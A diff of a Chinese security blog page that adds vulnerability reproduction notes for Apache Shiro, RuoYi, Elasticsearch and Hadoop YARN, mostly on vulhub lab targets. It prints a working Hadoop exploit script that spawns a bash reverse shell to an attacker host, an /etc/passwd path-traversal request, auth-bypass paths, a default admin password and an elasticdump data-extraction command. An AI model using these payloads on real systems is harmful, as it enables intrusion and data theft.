@@ -184,6 +184,389 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/WEB%E6%A1%86%E6%9E%B6/Shiro.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/WEB%E6%A1%86%E6%9E%B6/Shiro.html" class="post-title-link" itemprop="url">Shiro</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-06 18:14:49" itemprop="dateCreated datePublished" datetime="2022-07-06T18:14:49+08:00">2022-07-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-16 10:18:58" itemprop="dateModified" datetime="2023-04-16T10:18:58+08:00">2023-04-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E6%A1%86%E6%9E%B6/" itemprop="url" rel="index"><span itemprop="name">WEB框架</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="shiro反序列化">1. shiro反序列化</h1><p>More info : 抓包查看请求包的cookie字段中是否包含remeberMe字段，存在则代表该网页使用的是shiro框架</p>
+<h2 id="shiro-550">1.1. shiro-550</h2><h3 id="漏洞原理：">1.1.1. 漏洞原理：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。</span><br></pre></td></tr></table></figure>
+
+<h3 id="影响版本：">1.1.2. 影响版本：</h3><p><code>Apache Shiro &lt; 1.2.4</code></p>
+<h3 id="环境搭建：">1.1.3. 环境搭建：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">攻击者:kali 192.168.179.129</span><br><span class="line">靶机:ubuntu 192.168.179.130 -- 需要安装vulhub</span><br><span class="line"></span><br><span class="line">		靶机部署:</span><br><span class="line">		下载安装vulhub，不会安装可以看unauth中的hadoop那篇文章</span><br><span class="line">		cd vulhub/shiro/CVE-2016-4437/</span><br><span class="line">		sudo docker-compose up -d // 启动环境</span><br><span class="line">		访问靶机8080端口页面如下即部署完成</span><br><span class="line">		sudo docker-compose down // 做完关闭靶机环境</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/07/HLhufiWJybSI9T8.png" alt="image-20220707093716391"></p>
+<h3 id="漏洞复现：">1.1.4. 漏洞复现：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里使用到了shiro_rce检测工具和railgun利用工具</span><br><span class="line">先使用shiro_rce工具检测key值</span><br><span class="line">再使用railgun工具进行命令执行</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/07/SQer1iDbEFmlNaA.png" alt="image-20220707112306178"></p>
+<p><img src="https://s2.loli.net/2022/07/07/F973B5D2tySpfXl.png" alt="image-20220707112355992"></p>
+<hr>
+<h2 id="shiro-721">1.2. shiro-721</h2><h3 id="漏洞原理：-1">1.2.1. 漏洞原理：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行</span><br></pre></td></tr></table></figure>
+
+<h3 id="影响版本：-1">1.2.2. 影响版本：</h3><p><code>Apache Shiro &lt; 1.4.2</code></p>
+<h3 id="漏洞利用：">1.2.3. 漏洞利用：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">条件:</span><br><span class="line">1. 登录目标网站，获取登录后的Cookie，因为需要有效cookie，且必须存在remember字段</span><br><span class="line">复现方法：</span><br><span class="line">使用railgun工具</span><br><span class="line">1. 将cookie完整的复制到cookie栏</span><br><span class="line">2. 选择yso gadget，并在命令栏写入对应命令</span><br><span class="line">3. 点击获取信息，即可根据gadget和cmd开始伪造cookie，最终会返回一个伪造后的cookie，使用该cookie发包请求即可造成反序列化攻击</span><br></pre></td></tr></table></figure>
+
+<h1 id="CVE-2020-1957-身份认证绕过">2. CVE-2020-1957(身份认证绕过)</h1><h2 id="漏洞原理：-2">2.1. 漏洞原理：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们请求的URL在整个项目的传入传递过程。在使用了shiro的项目中，是我们请求的URL(URL1),进过shiro权限检验(URL2), 最后到springboot项目找到路由来处理(URL3)</span><br><span class="line">漏洞的出现就在URL1,URL2和URL3 有可能不是同一个URL，这就导致我们能绕过shiro的校验，直接访问后端需要首选的URL</span><br></pre></td></tr></table></figure>
+
+<h2 id="影响版本：-2">2.2. 影响版本：</h2><p><code>Apache Shiro &lt; 1.5.3</code></p>
+<h2 id="环境搭建：-1">2.3. 环境搭建：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">靶机:ubuntu 192.168.179.130</span><br><span class="line"></span><br><span class="line">		靶机部署:</span><br><span class="line">			cd vulhub/shiro/CVE-2020-1957/</span><br><span class="line">			sudo docker-compose up -d // 启动环境</span><br><span class="line">			访问到靶机8080端口，显示下图页面即部署成功</span><br><span class="line">			sudo docker-compose down // 做完关闭靶机环境</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/07/trdvbyQq24RmnFx.png" alt="image-20220707124311092"></p>
+<h2 id="漏洞复现：-1">2.4. 漏洞复现：</h2><p><code>正常情况访问点login登录是需要密码的，访问admin页面会重定向回登录页面</code></p>
+<p><img src="https://s2.loli.net/2022/07/07/HFuGYQUgpJ6hKyk.png" alt="image-20220707125124117"></p>
+<p><code>访问该目录/xxx/..;/admin/即可绕过登录验证</code></p>
+<p><img src="https://s2.loli.net/2022/07/07/e2hFoWxw3Il6VcX.png" alt="image-20220707124942061"></p>
+<h1 id="CVE-2020-11989-身份认证绕过">3. CVE-2020-11989(身份认证绕过)</h1><h2 id="漏洞描述：">3.1. 漏洞描述：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击者可以通过/;/拼接后台地址或已知接口达到绕过身份验证的效果访问接口的效果。</span><br></pre></td></tr></table></figure>
+
+<h2 id="测试过程：">3.2. 测试过程：</h2><p>某次gov渗透测试时发现了shiro框架，测试之后发现并没有反序列化漏洞，JS中暴露的API接口也并不能访问，于是乎尝试使用身份认证绕过漏洞进行测试（因为shiro存在很多身份认证绕过漏洞）。</p>
+<ol>
+<li><p>首先访问任意目录，都会重定向回登录主页，使用<code>/;/111</code>进行测试发现返回404（表示客户端已经去访问这个文件，并且绕过了身份验证）。</p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416101041742.png" alt="image-20230416101041742"></p>
+</li>
+<li><p>通过<code>/;/</code>对之前收集API接口进行访问测试，果然是能够访问到的。</p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416101522105.png" alt="image-20230416101522105"></p>
+</li>
+<li><p>之前收集的一个upload上传接口，构造数据包尝试一下，上传成功了。</p>
+<p>这里开发忘记给&#x2F;files和文件名直接加&#x2F;了，导致我一直没访问到这个文件。后续测试另一个同样的站点的时候才发现，访问到文件的时候发现目录没有执行权限，是直接下载的。</p>
+</li>
+</ol>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416101711015.png" alt="image-20230416101711015"></p>
+<h1 id="CVE-2022-32532-身份认证绕过">4. CVE-2022-32532(身份认证绕过)</h1><h2 id="风险描述">4.1. 风险描述:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当 Apache Shiro 中使用 RegexRequestMatcher 进行权限配置，且正则表达式中携带“.”时，未经授权的远程攻击者可通过构造恶意数据包绕过身份认证。</span><br></pre></td></tr></table></figure>
+
+<h2 id="影响版本">4.2. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Shiro &lt; 1.9.1</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现">4.3. 漏洞复现:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过%0a,%0b绕过验证</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/CMS/RuoYi.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/CMS/RuoYi.html" class="post-title-link" itemprop="url">RuoYi</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-06 17:14:49" itemprop="dateCreated datePublished" datetime="2022-07-06T17:14:49+08:00">2022-07-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-18 19:24:30" itemprop="dateModified" datetime="2023-04-18T19:24:30+08:00">2023-04-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CMS/" itemprop="url" rel="index"><span itemprop="name">CMS</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="RuoYi后台默认口令-任意文件读取">0.0.1. RuoYi后台默认口令+任意文件读取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">有些情况访问若依后台时网页会已输入账号密码，通常情况为默认口令保存</span><br><span class="line">默认口令 admin/admin123</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/06/hYU6e14y8XOSlus.png"></p>
+<h4 id="漏洞利用：">0.0.1.1. 漏洞利用：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">登录到后台时可以尝试读取下面文件，不一定成功</span><br><span class="line">/common/download/resource?resource=/profile/../../../../etc/passwd // 读取passwd文件</span><br></pre></td></tr></table></figure>
+
+<h3 id="Shiro反序列化">0.0.2. Shiro反序列化</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">若依后台管理系统基于SpringBoot的权限管理系统 易读易懂、界面简洁美观。 核心技术采用Spring、MyBatis、Shiro。所以也可能存在Shiro反序列化</span><br><span class="line">可到iframe分类shiro中查看文章</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/wUkIly19xLOt0e-B4O-hsg">其他漏洞利用</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/%E6%95%B0%E6%8D%AE%E5%BA%93/Elasticsearch.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/%E6%95%B0%E6%8D%AE%E5%BA%93/Elasticsearch.html" class="post-title-link" itemprop="url">Elasticsearch</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-06 11:14:49" itemprop="dateCreated datePublished" datetime="2022-07-06T11:14:49+08:00">2022-07-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-16 10:39:11" itemprop="dateModified" datetime="2023-04-16T10:39:11+08:00">2023-04-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" itemprop="url" rel="index"><span itemprop="name">数据库</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Elasticsearch未授权访问">1. Elasticsearch未授权访问</h1><h2 id="风险描述：">1.1. 风险描述：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Elasticsearch是一款java编写的企业级搜索服务。越来越多的公司使用ELK作为日志分析，启动此服务默认会开放9200端口，可被非法操作数据</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/06/wy3UbJSEjdWCFHP.png" alt="image-20220706110218953"></p>
+<h2 id="漏洞验证：">1.2. 漏洞验证：</h2><p><code>访问x.x.x.x:9200发现下图页面</code></p>
+<p><img src="https://s2.loli.net/2022/07/06/XTgVnKO6NGoWUyq.png" alt="image-20220706110427054.png"></p>
+<h3 id="Linux">1.2.1. Linux</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/360EntSecGroup-Skylar/ElasticHD/releases/download/1.4/elasticHD_linux_amd64.zip // 下载ElasticHD安装包</span><br><span class="line">unzip elasticHD_linux_amd64.zip // 解压</span><br><span class="line">chmod 777 ElasticHD // 修改权限</span><br><span class="line">exec ./ElasticHD -p 127.0.0.1:9800 // 执行，若执行无效找到 ElasticHD 文件直接打开即可</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/06/ixsTrOj916XVgkH.png" alt="image-20220706155751271"></p>
+<h3 id="windows">1.2.2. windows</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、下载工具https://github.com/qax-os/ElasticHD/releases/download/1.4/elasticHD_windows_amd64.zip</span><br><span class="line">2、ElasticHD.exe -p 127.0.0.1:9800</span><br><span class="line"></span><br><span class="line">下面打开本地连接，输入未授权访问的地址即可。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220905160348282.png" alt="image-20220905160348282"></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220905160556247.png" alt="image-20220905160556247"></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220905160625803.png" alt="image-20220905160625803"></p>
+<h2 id="漏洞利用：">1.3. 漏洞利用：</h2><p>这里使用Elasticdump进行节点数据下载查看，这里推荐安装npm进行下载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br><span class="line">npm -v</span><br><span class="line">确保环境存在</span><br><span class="line"></span><br><span class="line">npm install elasticdump，安装elasticdump，全局搜索一下安装成功的目录，可以把他添加到环境变量中</span><br><span class="line"></span><br><span class="line">elasticdump --input=http://xxxx:8120/节点名称 --output=F:\dm_entity_expert_info.json --limit 10000</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞修复：">1.4. 漏洞修复：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、开启身份验证，防止未经授权用户访问。</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/WEB%E5%BA%94%E7%94%A8/Hadoop.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/WEB%E5%BA%94%E7%94%A8/Hadoop.html" class="post-title-link" itemprop="url">Hadoop</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-06 11:14:49" itemprop="dateCreated datePublished" datetime="2022-07-06T11:14:49+08:00">2022-07-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-16 10:40:03" itemprop="dateModified" datetime="2023-04-16T10:40:03+08:00">2023-04-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E5%BA%94%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">WEB应用</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="hadoop未授权访问">1. hadoop未授权访问</h1><h2 id="风险描述：">1.1. 风险描述：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Hadoop YARN 提供有默认开放在8088和8090的 REST API（默认前者）允许用户直接通过 API 进行相关的应用创建、任务提交执行等操作，如果配置不当，REST API 将会开放在公网导致未授权访问的问题，那么任何黑客则就均可利用其进行远程命令执行，从而进行挖矿等行为。</span><br></pre></td></tr></table></figure>
+
+<p>More info : 该服务默认开放端口50070，未授权端口8088</p>
+<h2 id="环境搭建：">1.2. 环境搭建：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">攻击者：kali 192.168.179.129</span><br><span class="line">靶机：ubuntu 192.168.179.130 -- 需要安装 vulhub 环境</span><br><span class="line">		</span><br><span class="line">		靶机部署：</span><br><span class="line">		pip install docker-compose</span><br><span class="line">		git clone https://github.com/vulhub/vulhub.git // 安装 vulhub 环境</span><br><span class="line">		cd vulhub/hadoop/unauthorized-yarn // 进入环境目录</span><br><span class="line">		sudo docker-compose up -d // 启动环境</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/e5Yks3aDljJHAXt.png" alt="image-20220706094141516"></p>
+<h2 id="复现过程：">1.3. 复现过程：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问x.x.x.x:50070发现下图页面</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/05/P1JgfCYRadre2kE.png" alt="image-20220705143102545"></p>
+<p>More info : 访问到该网页也算未授权访问，vulhub环境不会开启该端口页面</p>
+<h4 id="漏洞利用：">1.3.0.1. 漏洞利用：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 9999 // 开启监听9999端口</span><br><span class="line">python3 exp.py // 利用下方代码生成exp.py文件并执行</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/06/mI3WLp46CtSAQ5J.png" alt="hadoop.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">target = &#x27;http://172.31.153.41:8088/&#x27;</span><br><span class="line">lhost = &#x27;xx&#x27; # 修改lhost反弹shell的IP</span><br><span class="line"></span><br><span class="line">url = target + &#x27;ws/v1/cluster/apps/new-application&#x27;</span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[&#x27;application-id&#x27;]</span><br><span class="line">url = target + &#x27;ws/v1/cluster/apps&#x27;</span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;application-id&#x27;: app_id,</span><br><span class="line">    &#x27;application-name&#x27;: &#x27;get-shell&#x27;,</span><br><span class="line">    &#x27;am-container-spec&#x27;: &#123;</span><br><span class="line">        &#x27;commands&#x27;: &#123;</span><br><span class="line">            &#x27;command&#x27;: &#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/8080 0&gt;&amp;1&#x27; % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#x27;application-type&#x27;: &#x27;YARN&#x27;,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞修复：">1.3.0.2. 漏洞修复：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、开启身份验证，防止未经授权用户访问。</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/pages/%E4%B8%AD%E9%97%B4%E4%BB%B6/Tomcat.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -928,152 +1311,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/pages/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80/Python/Python%E7%88%AC%E8%99%AB.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="气温太低">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="qwtd-blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/pages/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80/Python/Python%E7%88%AC%E8%99%AB.html" class="post-title-link" itemprop="url">爬虫</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-07-04 15:56:49" itemprop="dateCreated datePublished" datetime="2022-07-04T15:56:49+08:00">2022-07-04</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-04-16 10:24:35" itemprop="dateModified" datetime="2023-04-16T10:24:35+08:00">2023-04-16</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80/" itemprop="url" rel="index"><span itemprop="name">高级语言</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80/Python/" itemprop="url" rel="index"><span itemprop="name">Python</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="python爬虫">1. python爬虫</h1><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1ZT4y1d7JM?p=1">python爬虫视频链接</a></p>
-<h2 id="Requests">1.1. Requests</h2><h3 id="GET">1.1.1. GET</h3><h4 id="基础介绍">1.1.1.1. 基础介绍</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#请求头</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">query = <span class="built_in">input</span>(<span class="string">&quot;请输入你要搜索的内容&quot;</span>)</span><br><span class="line"><span class="comment">#将url的某个参数作为变量去控制</span></span><br><span class="line">url = <span 